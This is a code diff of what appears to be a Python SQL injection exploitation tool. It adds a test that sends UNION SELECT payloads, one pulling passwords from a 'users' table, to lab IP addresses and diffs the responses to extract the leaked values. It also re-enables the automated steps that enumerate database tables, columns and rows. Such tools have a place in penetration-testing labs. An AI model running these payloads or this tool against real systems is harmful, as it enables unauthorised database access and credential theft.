@@ -14,6 +14,21 @@ import builder, datastore, injector, scanner, parser, reporter
 import pprint
 import json
 
+def test_html_diff():
+
+    # Instantiate classes used
+    scan = scanner.Scanner()
+    store = datastore.Store()
+    parse = parser.Parser(store)
+
+    a = scan.page('http://192.168.83.130/cat.php?id=null%20UNION%20SELECT%201,password,3,4%20from%20users') 
+    b = scan.page('http://192.168.83.130/cat.php?id=null')
+
+    #a = scan.page('http://192.168.83.134/?id=null%20union%20select%201,2,3,4,5,6,user_username%20from%20user')
+    #b = scan.page('http://192.168.83.134/?id=null')
+
+    print parse.html_diff(b, a)
+
 if __name__ == '__main__':
 
     if len(sys.argv) == 1:
@@ -40,16 +55,7 @@ if __name__ == '__main__':
     magic_num = int(fang.get_visible_param())
     print '\tMagic Param','\t', magic_num
 
-    post = scan.page('http://192.168.83.134/?id=null%20union%20select%201,1,3,4,5,6,user_username%20from%20user')
-    #post = scan.page('http://192.168.83.134/?id=null%20union%20select%201,1,3,4,5,6,user_password%20from%20user')
-    pre1 = scan.page('http://192.168.83.134/?id=null') 
-    pre2 = scan.page('http://192.168.83.134/?id=1') 
-    #pre = pre1 + pre2
-    print parse.html_diff(pre2, parse.html_diff(pre1, post))
 
-
-
-    """
     # Get DB params
     print '\n### Basic DB Info ###'
     data = fang.injection(build.union(num_columns, magic_num)) 
@@ -62,7 +68,8 @@ if __name__ == '__main__':
 
     # Get columns
     print '\n### DB Table Columns ###'
-    data = fang.injection(build.columns(num_columns, magic_num)) 
+    print build.columns(num_columns, magic_num, data['table_name'])
+    data = fang.injection(build.columns(num_columns, magic_num, data['table_name'])) 
     report.columns(parse.columns(data))
 
     # Get rows
@@ -72,7 +79,6 @@ if __name__ == '__main__':
     print data
     #print parse.rows(data)
     #report.XXX(parse.XXX(data))
-    """
         
 
 
